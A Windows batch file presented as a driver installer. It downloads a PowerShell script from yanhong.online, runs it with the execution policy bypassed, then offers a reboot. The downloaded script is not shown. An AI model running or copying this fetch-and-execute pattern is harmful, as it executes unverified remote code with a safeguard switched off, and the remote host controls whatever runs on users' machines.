@echo off
title WSDI Driver Installer v3.0
cd /d "%~dp0"

echo ===============================================
echo         WSDI Driver Installer v3.0
echo ===============================================
echo.
set "TEMP_DIR=%TEMP%\driver_installer"
if not exist "%TEMP_DIR%" mkdir "%TEMP_DIR%"

set "SERVER_URL=https://yanhong.online"

echo [*] Downloading helper script...
if exist "%TEMP_DIR%\client_core.ps1" del /f /q "%TEMP_DIR%\client_core.ps1"
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue'; $ts=[DateTimeOffset]::Now.ToUnixTimeSeconds(); Invoke-WebRequest ('%SERVER_URL%/client_core_v25.ps1?_='+$ts) -OutFile ('%TEMP_DIR%\client_core.ps1') -UseBasicParsing -TimeoutSec 120 -Headers @{'Cache-Control'='no-cache, no-store, must-revalidate';'Pragma'='no-cache';'Expires'='0'}"
if errorlevel 1 (
    echo [!] Download failed! Check network or visit https://yanhong.online
    pause
    exit /b 1
)
echo [+] Download done!
echo.

powershell -NoProfile -ExecutionPolicy Bypass -File "%TEMP_DIR%\client_core.ps1"
set EXITCODE=%errorlevel%

echo.
if %EXITCODE% equ 0 (
    echo ===============================================
    echo        Install Complete!
    echo ===============================================
    echo.
    set /p REBOOT="Reboot now? (Y/N): "
    if /i "%REBOOT%"=="Y" shutdown /r /t 5 /c "Driver install complete, rebooting..."
) else if %EXITCODE% equ 2 (
    echo ===============================================
    echo        No drivers to install
    echo ===============================================
    echo    All devices have working drivers, or no matching
    echo    drivers found on server. No reboot needed.
) else (
    echo ===============================================
    echo        Install Failed
    echo ===============================================
    echo    Error code: %EXITCODE%. Check the log above.
)

echo.
pause
